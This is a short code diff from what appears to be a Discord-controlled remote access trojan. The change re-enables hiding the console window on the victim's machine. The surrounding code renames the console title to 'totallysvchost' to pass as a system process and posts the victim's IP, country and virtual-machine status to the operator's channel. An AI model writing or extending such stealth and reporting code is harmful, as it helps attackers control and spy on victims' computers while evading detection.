@@ -421,12 +421,12 @@ async def on_ready():
 - [2;34mip[0m: [2;35m{country}, {ip}[0m
 - [2;34mis vm: [2;35m{isvm}[0m```""")
 	whnd = ctypes.windll.kernel32.GetConsoleWindow()
-	#if whnd != 0:
-	#   try:
-	#       ctypes.windll.user32.ShowWindow(whnd, 0)
-	#       await channel.send(await femboyaccess("stealth", "python window has been hidden! :3"))
-	#   except:
-	#       await channel.send(await femboyaccess("stealth", "could not hide the python window! :c"))
+	if whnd != 0:
+	   try:
+	       ctypes.windll.user32.ShowWindow(whnd, 0)
+	       await channel.send(await femboyaccess("stealth", "python window has been hidden! :3"))
+	   except:
+	       await channel.send(await femboyaccess("stealth", "could not hide the python window! :c"))
 	try:
 		ctypes.windll.kernel32.SetConsoleTitleW("totallysvchost")
 		await channel.send(await femboyaccess("stealth", "changed process name! :3"))
